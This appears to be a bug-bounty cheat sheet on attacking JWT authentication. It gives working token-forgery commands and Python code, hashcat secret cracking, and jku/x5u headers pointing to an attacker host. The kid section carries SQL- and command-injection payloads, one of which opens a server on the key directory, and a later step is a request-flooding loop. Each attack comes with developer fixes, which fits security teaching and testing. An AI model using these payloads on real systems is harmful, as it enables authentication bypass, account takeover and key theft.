

# 🔐 JWT Attacks  — Cheat Sheet

> **Organized by:** Severity (Critical → High → Medium)  
> **For:** Bug Bounty & Penetration Testing |

---

## 📋 Table of Contents

| #   | Attack                                  | Severity       | Page       |
| --- | --------------------------------------- | -------------- | ---------- |
| 0   | Recon — Identify JWT Usage              | —              | Below      |
| 1   | Algorithm Confusion (RS256 → HS256)     | 🔴 Critical    | Section 1  |
| 2   | `alg: none` Signature Bypass            | 🔴 Critical    | Section 2  |
| 3   | Weak Secret Key (HS256 Brute-force)     | 🟠 High        | Section 3  |
| 4   | `jwk` Header Injection (CVE-2018-0114)  | 🟠 High        | Section 4  |
| 5   | `jku` Header Injection / JWKS Spoofing  | 🟠 High        | Section 5  |
| 6   | `kid` Path Traversal / Injection        | 🟡 Medium-High | Section 6  |
| 7   | JWE-wrapped PlainJWT (CVE-2026-29000)   | 🔴 Critical    | Section 7  |
| 8   | Missing Claim Validation                | 🟡 Medium      | Section 8  |
| 9   | `x5u` / `x5c` Certificate Injection     | 🟠 High        | Section 9  |
| 10  | ES256 Private Key Recovery (Same Nonce) | 🟠 High        | Section 10 |
| 11  | Cross-Service Relay Attack              | 🟡 Medium      | Section 11 |
| 12  | JTI Replay Abuse                        | 🟡 Medium      | Section 12 |

---

## 0️⃣ Recon — Identify JWT Usage (ALWAYS FIRST)

### 🎯 Goal
Confirm the application uses JWT and understand how it's verified.

### 🔍 Step-by-Step

**Step 1:** Login with valid credentials.

**Step 2:** Check request headers or cookies for JWT tokens:
```
Authorization: Bearer eyJ...
OR
Cookie: session=eyJ...
```

**Step 3:** Decode the JWT using Burp Suite, jwt.io, or jwt_tool:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

**Step 4:** Note these critical header fields:
| Field | What It Means |
|-------|---------------|
| `alg` | Algorithm used (HS256, RS256, ES256, none) |
| `kid` | Key ID — tells server which key to use |
| `jku` | URL to fetch the public key set |
| `jwk` | Embedded public key inside the token |
| `x5u` | URL to X.509 certificate |
| `x5c` | Embedded X.509 certificate |

**Step 5:** Note payload claims that drive authorization:
- `sub` — user identifier
- `role` / `admin` / `is_admin` — privilege level
- `exp` — expiration time
- `iss` — who issued the token
- `aud` — intended audience

### 🛠️ Quick Automation
```bash
# Run all automated tests
python3 jwt_tool.py -M at     -t "https://target.com/api/v1/user/profile"     -rh "Authorization: Bearer <JWT_TOKEN>"
```

---

# 🔴 CRITICAL SEVERITY

---

## 1️⃣ Algorithm Confusion — RS256 → HS256 (CVE-2016-5431 / CVE-2016-10555)

### 📖 What Is It?
The server uses **RS256** (asymmetric — private key signs, public key verifies).  
But if you change the header to **HS256** (symmetric — same secret signs and verifies), the server may **mistakenly use the RSA public key as the HMAC secret**. Since the public key is often public, you can forge valid signatures.

### 🎯 Impact
- Full authentication bypass
- Privilege escalation to any user/role
- Admin account takeover

### 🛠️ Tools Needed
- Burp Suite + JWT Editor extension
- jwt_tool
- openssl

### 📋 Step-by-Step Walkthrough

**Step 1: Capture a valid JWT**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.SIGNATURE
```

**Step 2: Get the RSA public key**

*Option A: From JWKS endpoint*
```bash
curl https://target.com/.well-known/jwks.json
```

*Option B: From TLS certificate*
```bash
openssl s_client -connect target.com:443 2>&1 < /dev/null |     sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem

openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

**Step 3: Convert public key to Base64-encoded PEM**
```bash
cat pubkey.pem | base64 -w 0
# Copy this output
```

**Step 4: Create a symmetric key in JWT Editor**
1. Open Burp → JWT Editor → Keys tab → "New Symmetric Key"
2. In JWK format, replace the `k` value with the Base64 PEM you copied
3. This tricks the server into using the public key as HMAC secret

**Step 5: Modify the JWT**
1. In Repeater, edit the JWT
2. Change header: `"alg": "HS256"`
3. Change payload: `"sub": "administrator"` (or `"role": "admin"`)
4. Click "Sign" → Select your symmetric key
5. **Important:** Check "Don't modify header"

**Step 6: Send the request**
```
GET /admin HTTP/1.1
Authorization: Bearer <FORGED_JWT>
```

### ⚡ One-Liner with jwt_tool
```bash
python3 jwt_tool.py <JWT> -X k -pk my_public.pem
```

### 🛡️ Developer Fix
```python
# NEVER trust the alg header from the token
# Enforce the expected algorithm server-side

import jwt

# ❌ VULNERABLE — trusts token's alg
jwt.decode(token, key=public_key, algorithms=["RS256", "HS256"])

# ✅ SECURE — enforces only RS256
jwt.decode(token, key=public_key, algorithms=["RS256"])
```

---

## 2️⃣ `alg: none` Signature Bypass (CVE-2015-9235)

### 📖 What Is It?
JWT standard includes an `"alg": "none"` option for debugging.  
If the server accepts tokens with no signature, anyone can forge tokens.

### 🎯 Impact
- No signature verification at all
- Anyone can forge any token
- Complete authentication bypass

### 🛠️ Tools Needed
- Burp Suite + JWT Editor
- jwt_tool
- jwt.io

### 📋 Step-by-Step Walkthrough

**Step 1: Get a valid JWT**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SIGNATURE
```

**Step 2: Decode the header and payload**
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ" | base64 -d
# {"sub":"user123","role":"user"}
```

**Step 3: Modify the header to use "none"**
```json
{"alg":"none","typ":"JWT"}
```

**Step 4: Modify the payload**
```json
{"sub":"administrator","role":"admin"}
```

**Step 5: Base64url-encode both parts**
```bash
# Header
echo -n '{"alg":"none","typ":"JWT"}' | base64url_encode
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Payload
echo -n '{"sub":"administrator","role":"admin"}' | base64url_encode
# eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0
```

**Step 6: Construct the token — REMOVE signature but keep the trailing dot**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
```
> ⚠️ **The trailing dot is REQUIRED!** Without it, the server may reject the token.

**Step 7: Send the request**
```
GET /admin HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
```

### ⚡ Quick Automation
```bash
python3 jwt_tool.py <JWT> -X a
```

### 🔍 Variants to Try
The server might only check for exact string match. Try these:
- `none`
- `None`
- `NONE`
- `nOnE`
- `nONE`
- `None `

### 🛡️ Developer Fix
```python
# ❌ VULNERABLE
if algorithm == "none":
    skip_verification()

# ✅ SECURE — explicitly reject "none"
if algorithm.lower() == "none":
    raise ValueError("Algorithm 'none' is not allowed")

# Even better — whitelist allowed algorithms
ALLOWED_ALGORITHMS = ["RS256", "ES256"]
if algorithm not in ALLOWED_ALGORITHMS:
    raise ValueError(f"Algorithm {algorithm} not allowed")
```

---

## 7️⃣ JWE-wrapped PlainJWT (CVE-2026-29000 — pac4j-jwt)

### 📖 What Is It?
Some systems use **JWE** (encrypted JWT) wrapping an inner signed JWT.  
In vulnerable versions of pac4j-jwt, if the decrypted inner token is a **PlainJWT** (`alg=none`), the signature verification is **skipped entirely**.

### 🎯 Impact
- Forge encrypted tokens for ANY user/role
- Full authentication bypass using only the public key
- Admin takeover

### 🛠️ Tools Needed
- Python with `jwcrypto` library
- Access to server's JWKS endpoint

### 📋 Step-by-Step Walkthrough

**Step 1: Confirm the target accepts JWE tokens**
Look for:
- API docs mentioning "encrypted JWT" or "JWE"
- Headers like `RSA-OAEP-256`, `A256GCM`
- JWKS endpoint exposing RSA keys

**Step 2: Fetch the server's public key**
```bash
curl https://target.com/.well-known/jwks.json
```

**Step 3: Build the inner PlainJWT (alg=none)**
```python
import json
import base64

b64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")

header = {"alg": "none"}
claims = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "target"}

plain_jwt = (
    f"{b64(json.dumps(header, separators=(',', ':')).encode())}."
    f"{b64(json.dumps(claims, separators=(',', ':')).encode())}."
)
print(plain_jwt)
```

**Step 4: Encrypt the PlainJWT as JWE**
```python
from jwcrypto import jwk, jwe

# Load the RSA public key from JWKS
jwks = {...}  # fetched from server
rsa_key = jwk.JWK(**jwks["keys"][0])

# Encrypt the PlainJWT
token = jwe.JWE(
    plaintext=plain_jwt.encode(),
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}),
    recipient=rsa_key,
)

forged = token.serialize(compact=True)
print(forged)
```

**Step 5: Send the forged JWE token**
```
GET /admin HTTP/1.1
Authorization: Bearer <FORGED_JWE_TOKEN>
```

### 🛡️ Developer Fix
```python
# Always verify the inner JWT signature
decrypted = jwe.decrypt(encrypted_token, private_key)
inner_jwt = jwt.decode(decrypted, verify=True)  # Don't skip verification!

# Reject PlainJWT (alg=none) explicitly
if inner_jwt.header.get("alg") == "none":
    raise SecurityError("PlainJWT not allowed")
```

---

# 🟠 HIGH SEVERITY

---

## 3️⃣ Weak Secret Key (HS256 Brute-force)

### 📖 What Is It?
HS256 uses a **symmetric secret** to sign tokens. If this secret is weak (like `secret`, `password`, `123456`), attackers can crack it offline and forge tokens.

### 🎯 Impact
- Token forgery
- Privilege escalation
- Session takeover for ALL users

### 🛠️ Tools Needed
- jwt_tool
- hashcat (GPU-accelerated)
- Wordlist

### 📋 Step-by-Step Walkthrough

**Step 1: Copy the JWT to a file**
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.SIGNATURE" > jwt.txt
```

**Step 2: Brute-force with jwt_tool**
```bash
python3 jwt_tool.py jwt.txt -C -d /usr/share/wordlists/rockyou.txt
```

**Step 3: Brute-force with hashcat (much faster)**
```bash
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack (mutations)
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force (short secrets)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

**Step 4: Once cracked, re-sign a forged token**
```bash
# jwt_tool will prompt you to modify claims
python3 jwt_tool.py jwt.txt -T

# When prompted:
# > Enter new value for role: admin
# > Enter the cracked secret: secret123
# > Select algorithm: [1] HMAC-SHA256
```

**Step 5: Use the forged token**
```
Authorization: Bearer <FORGED_TOKEN>
```

### 🛡️ Developer Fix
```python
import secrets

# ❌ VULNERABLE — weak secret
SECRET = "secret"

# ✅ SECURE — strong random secret (min 256 bits)
SECRET = secrets.token_urlsafe(32)  # 32 bytes = 256 bits

# Store in environment variable, never in code
SECRET = os.environ.get("JWT_SECRET")
```

---

## 4️⃣ `jwk` Header Injection (CVE-2018-0114)

### 📖 What Is It?
The `jwk` header contains an **embedded public key**. If the server trusts this embedded key to verify the signature, an attacker can embed their own public key and sign with their own private key.

### 🎯 Impact
- Attacker controls the verification key
- Admin access without knowing server secrets
- Full auth bypass

### 🛠️ Tools Needed
- openssl
- jwt_tool or Burp JWT Editor

### 📋 Step-by-Step Walkthrough

**Step 1: Generate your own RSA key pair**
```bash
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout -out attacker_public.pem
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in attacker_key.pem -out attacker_private.pem
```

**Step 2: Get the `n` and `e` values from your public key**
```python
from Crypto.PublicKey import RSA

fp = open("attacker_public.pem", "r")
key = RSA.importKey(fp.read())
fp.close()

print("n:", hex(key.n))
print("e:", hex(key.e))
```

**Step 3: Modify the JWT header to include your public key as `jwk`**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}
```

**Step 4: Modify the payload**
```json
{"sub": "administrator", "role": "admin"}
```

**Step 5: Sign with your private key**
```bash
# Using jwt_tool
python3 jwt_tool.py <JWT> -X i
```

**Step 6: Send the request**

### ⚡ Quick with Burp JWT Editor
1. Add a New RSA key in JWT Editor
2. In Repeater, edit the JWT
3. Attack → Embedded JWK
4. Sign with your key and send

### 🛡️ Developer Fix
```python
# ❌ VULNERABLE — trusts embedded JWK
key = jwt.header.get("jwk")

# ✅ SECURE — ignore embedded keys, use server-configured keys only
key = load_key_from_server_config(jwt.header.get("kid"))
if "jwk" in jwt.header:
    raise SecurityError("Embedded JWK not allowed")
```

---

## 5️⃣ `jku` Header Injection / JWKS Spoofing

### 📖 What Is It?
The `jku` (JWK Set URL) header tells the server where to fetch the public key.  
If the server fetches keys from attacker-controlled URLs, you can host your own JWKS and sign with your own private key.

### 🎯 Impact
- External key trust abuse
- Full authentication bypass
- SSRF (if server makes requests to arbitrary URLs)

### 🛠️ Tools Needed
- openssl
- Web server to host JWKS (Burp Collaborator, ngrok, or your own)
- jwt_tool

### 📋 Step-by-Step Walkthrough

**Step 1: Generate your RSA key pair**
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

**Step 2: Create your JWKS file**
```json
{
    "keys": [
        {
            "kid": "attacker-key-1",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DNlu91RySUTn0wqzBAm-aQ..."
        }
    ]
}
```

**Step 3: Host the JWKS file**
```bash
# Simple Python HTTP server
python3 -m http.server 8080
# Place jwks.json in the directory
```
Or use Burp Collaborator / ngrok for external hosting.

**Step 4: Modify the JWT header**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key-1"
}
```

**Step 5: Modify the payload**
```json
{"sub": "administrator", "role": "admin"}
```

**Step 6: Sign with your private key**
```bash
python3 jwt_tool.py <JWT> -X s -ju https://attacker.com/jwks.json
```

**Step 7: Send the request**

### 🔍 Detection Tip
Use Burp Collaborator to confirm the server fetches from `jku`:
1. JWT Editor → Attack → Embed Collaborator payload
2. Any callback confirms SSRF-style key retrieval

### 🛡️ Developer Fix
```python
# ❌ VULNERABLE — fetches from arbitrary URL
jku = jwt.header.get("jku")
key = fetch_key_from_url(jku)

# ✅ SECURE — whitelist allowed JWKS URLs
ALLOWED_JKU_URLS = ["https://auth.company.com/.well-known/jwks.json"]
if jku not in ALLOWED_JKU_URLS:
    raise SecurityError("Untrusted jku URL")
```

---

## 9️⃣ `x5u` / `x5c` Certificate Injection

### 📖 What Is It?
- `x5u`: URL pointing to X.509 certificate chain
- `x5c`: Embedded X.509 certificate in Base64

If the server trusts certificates from these headers, attackers can use self-signed certificates to forge tokens.

### 🎯 Impact
- Certificate trust abuse
- Full auth bypass
- SSRF via `x5u`

### 🛠️ Tools Needed
- openssl
- jwt.io or jwt_tool

### 📋 Step-by-Step Walkthrough

**Step 1: Generate a self-signed certificate**
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048     -keyout attacker.key -out attacker.crt

# Extract public key
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

**Step 2: For x5u — host the certificate**
```bash
# Host attacker.crt on your server
python3 -m http.server 8080
```

**Step 3: Modify JWT header**
```json
// For x5u
{
  "alg": "RS256",
  "x5u": "https://attacker.com/attacker.crt"
}

// For x5c
{
  "alg": "RS256",
  "x5c": ["MIIDXTCCAkWgAwIBAgIJAJC1HiIAZAiUMA0GCSqGSIb3Qa..."]
}
```

**Step 4: Modify payload and sign with attacker.key**
```bash
python3 jwt_tool.py <JWT> -X s
```

**Step 5: Send the request**

### 🛡️ Developer Fix
```python
# Reject x5u/x5c from untrusted sources
if "x5u" in jwt.header or "x5c" in jwt.header:
    raise SecurityError("External certificates not allowed")
```

---

## 🔟 ES256 Private Key Recovery (Same Nonce)

### 📖 What Is It?
ES256 uses ECDSA signatures. If the same **nonce (k value)** is used to sign two different messages, the private key can be mathematically recovered.

### 🎯 Impact
- Private key recovery
- Forge tokens for ALL users
- Complete system compromise

### 🛠️ Tools Needed
- Two JWTs signed with the same nonce
- Python script for ECDSA key recovery

### 📋 Step-by-Step Walkthrough

**Step 1: Obtain two JWTs with the same nonce**
This usually happens due to:
- Weak random number generation
- Deterministic nonce generation (e.g., `k = H(message + private_key)` without proper RFC 6979)

**Step 2: Extract signatures and messages**
```python
jwt1 = "eyJ..."  # Message 1 + Signature 1
jwt2 = "eyJ..."  # Message 2 + Signature 2

# Parse to get r, s values from signatures
```

**Step 3: Recover private key**
```python
from ecdsa import NIST256p, SigningKey, VerifyingKey
from ecdsa.util import sigdecode_string

# Using known nonce attack formula
# If r1 == r2 (same nonce), private key can be recovered:
# private_key = ((s1 * z2 - s2 * z1) * modinv(r * (s1 - s2), n)) % n

# Use tools like:
# https://github.com/SecuraBV/jws2pubkey
```

**Step 4: Use recovered key to forge tokens**

### 🛡️ Developer Fix
```python
# Use RFC 6979 deterministic nonce generation
# Or use cryptographically secure random
import secrets

# Python's ecdsa library uses RFC 6979 by default
sk = SigningKey.generate(curve=NIST256p)
```

---

# 🟡 MEDIUM SEVERITY

---

## 6️⃣ `kid` Path Traversal / Injection

### 📖 What Is It?
The `kid` (Key ID) tells the server which key to use. If the server uses `kid` to load a file from disk, attackers can use path traversal to point to files with known content (like `/dev/null`) and forge signatures.

### 🎯 Impact
- Arbitrary file read
- Signature bypass
- Potential RCE via command injection
- SQL injection if `kid` is used in database queries

### 🛠️ Tools Needed
- jwt_tool

### 📋 Step-by-Step Walkthrough

**Step 1: Identify how `kid` is used**
Check if the server loads a file based on `kid`:
```json
{"kid": "key/12345"}
# Server might load: /var/keys/key/12345.pem
```

**Step 2: Path Traversal — Point to `/dev/null`**
```bash
# /dev/null has empty content
# Set kid to traverse to /dev/null
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""
```

**Step 3: Use predictable file content**
```bash
# /proc/sys/kernel/randomize_va_space always contains "2"
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

**Step 4: SQL Injection via `kid`**
```json
{
  "kid": "non-existent-index' UNION SELECT 'ATTACKER';-- -"
}
```
This forces the server to use "ATTACKER" as the secret key.

**Step 5: OS Command Injection via `kid`**
```json
{
  "kid": "/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&"
}
```

### 🛡️ Developer Fix
```python
# ❌ VULNERABLE — uses kid directly as file path
key_path = f"/var/keys/{jwt.header.get('kid')}.pem"

# ✅ SECURE — validate kid against whitelist
ALLOWED_KIDS = ["key-2024-01", "key-2024-02"]
kid = jwt.header.get("kid")
if kid not in ALLOWED_KIDS:
    raise SecurityError("Invalid kid")

key_path = f"/var/keys/{kid}.pem"
```

---

## 8️⃣ Missing Claim Validation

### 📖 What Is It?
The server doesn't properly validate standard JWT claims like `exp` (expiration), `nbf` (not before), `aud` (audience), or `iss` (issuer).

### 🎯 Impact
- Session reuse (expired tokens still work)
- Token replay attacks
- Authorization flaws

### 📋 Step-by-Step Walkthrough

**Step 1: Check for `exp` claim**
```bash
python3 jwt_tool.py <JWT> -R
```

**Step 2: Remove or modify the `exp` claim**
```json
// Original
{"exp": 1718900000, "sub": "user123"}

// Modified — remove exp
{"sub": "user123"}
```

**Step 3: Replay the token after expiration**
Wait for the original token to expire, then send the modified one.

**Step 4: Test other claims**
| Claim | Test |
|-------|------|
| `exp` | Remove or set to future date |
| `nbf` | Set to past date |
| `aud` | Change to different service |
| `iss` | Change to different issuer |
| `iat` | Set to future date |


### 🛡️ Developer Fix
```python
import time

# ✅ SECURE — validate all claims
payload = jwt.decode(
    token,
    key=secret,
    algorithms=["HS256"],
    options={
        "require": ["exp", "iat", "iss"],
        "verify_exp": True,
        "verify_iat": True,
        "verify_iss": True,
    },
    issuer="expected-issuer",
    audience="expected-audience",
    leeway=60  # 60 seconds clock skew tolerance
)
```

---

## 1️⃣1️⃣ Cross-Service Relay Attack

### 📖 What Is It?
Some companies use a shared JWT service for multiple applications. A token issued for App A might be accepted by App B if they share the same signing key.

### 🎯 Impact
- Account spoofing across services
- Privilege escalation

### 📋 Step-by-Step Walkthrough

**Step 1: Identify if a third-party JWT service is used**
- Check `iss` claim
- Look for shared auth domains
- Check if signup on another client is possible

**Step 2: Sign up on another client with the same email/username**

**Step 3: Capture the JWT from the secondary client**

**Step 4: Replay the JWT on the target application**
```
GET /api/profile HTTP/1.1
Authorization: Bearer <TOKEN_FROM_OTHER_CLIENT>
```

**Step 5: If accepted, try escalating to other users**

### 🛡️ Developer Fix
```python
# Validate the audience claim
payload = jwt.decode(
    token,
    key=secret,
    algorithms=["HS256"],
    audience="my-specific-app"  # Reject tokens from other apps
)
```

---

## 1️⃣2️⃣ JTI Replay Abuse

### 📖 What Is It?
JTI (JWT ID) is meant to prevent replay attacks by giving each token a unique ID. If the ID space is too small (e.g., 4 digits), attackers can exploit integer overflow to replay tokens.

### 🎯 Impact
- Token replay
- Session hijacking

### 📋 Step-by-Step Walkthrough

**Step 1: Check the JTI format**
```json
{"jti": "0001"}
```

**Step 2: Understand the backend logic**
If backend increments JTI and only stores last N digits:
- Token `0001` and `10001` might be treated as the same ID

**Step 3: Send 10,000 requests to cycle the counter**
```bash
# Automated flooding to increment JTI counter
for i in {1..10000}; do
    curl -s https://target.com/api/action -H "Authorization: Bearer <TOKEN>"
done
```

**Step 4: Replay the original token**
The server now thinks the JTI is fresh because the counter overflowed.

### 🛡️ Developer Fix
```python
# Use UUID for JTI (128-bit, practically unique)
import uuid

jti = str(uuid.uuid4())  # e.g., "550e8400-e29b-41d4-a716-446655440000"

# Or use database to track used JTIs
if jti in used_jtis:
    raise SecurityError("Token already used")
used_jtis.add(jti)
```

---

# 📊 Quick Reference: Severity Matrix

| # | Attack | Severity | Complexity | Tools |
|---|--------|----------|------------|-------|
| 1 | Algorithm Confusion (RS256→HS256) | 🔴 Critical | Medium | jwt_tool, Burp JWT Editor |
| 2 | `alg: none` Bypass | 🔴 Critical | Easy | jwt_tool, jwt.io |
| 7 | JWE PlainJWT (CVE-2026-29000) | 🔴 Critical | Hard | Python + jwcrypto |
| 3 | Weak Secret Brute-force | 🟠 High | Easy | hashcat, jwt_tool |
| 4 | `jwk` Injection (CVE-2018-0114) | 🟠 High | Medium | openssl, jwt_tool |
| 5 | `jku` / JWKS Spoofing | 🟠 High | Medium | openssl, web server |
| 9 | `x5u` / `x5c` Injection | 🟠 High | Medium | openssl |
| 10 | ES256 Key Recovery | 🟠 High | Hard | Custom Python |
| 6 | `kid` Path Traversal | 🟡 Medium | Medium | jwt_tool |
| 8 | Missing Claim Validation | 🟡 Medium | Easy | jwt_tool |
| 11 | Cross-Service Relay | 🟡 Medium | Medium | Manual testing |
| 12 | JTI Replay Abuse | 🟡 Medium | Hard | Automation |

---

# 🛠️ Essential Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **jwt_tool** | All-in-one JWT testing | `python3 jwt_tool.py -M at -t <URL> -rh "Authorization: Bearer <JWT>"` |
| **Burp JWT Editor** | Decode, edit, sign in Repeater | Burp Extension |
| **hashcat** | GPU secret cracking | `hashcat -a 0 -m 16500 jwt.txt wordlist.txt` |
| **jwt.io** | Online decode/encode | https://jwt.io |
| **jwcrypto** | JWE/JWS in Python | `pip install jwcrypto` |
| **SignSaboteur** | Burp extension for JWT attacks | Burp Extension |
| **JOSEPH** | Burp extension for key confusion | Burp Extension |

---

# 🛡️ Developer Defense Checklist

```
□ Enforce fixed algorithm server-side (never trust token's alg header)
□ Separate RSA and HMAC verification logic completely
□ Never trust jku, jwk, x5u, x5c, or kid from user input
□ Use strong secrets (min 256-bit random for HS256)
□ Validate all claims: exp, nbf, iat, iss, aud
□ Reject alg: none explicitly
□ Use short token lifetimes (15-60 minutes)
□ Implement proper JTI tracking with UUID
□ Rotate signing keys regularly
□ Use asymmetric algorithms (RS256/ES256) over symmetric (HS256)
□ Log and monitor for suspicious JWT patterns
```

---

# 🔗 References

- [jwt_tool — ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [PortSwigger JWT Security](https://portswigger.net/web-security/jwt)
- [JWT.io](https://jwt.io)
- [RFC 7519 — JWT](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 — JWS](https://tools.ietf.org/html/rfc7515)
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [CVE-2016-5431](https://nvd.nist.gov/vuln/detail/CVE-2016-5431)
- [CVE-2018-0114](https://nvd.nist.gov/vuln/detail/CVE-2018-0114)
- [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000)

---

> **Tip:** Always start with `jwt_tool -M at` for automated scanning, then manually verify any findings. Happy hunting! 🎯
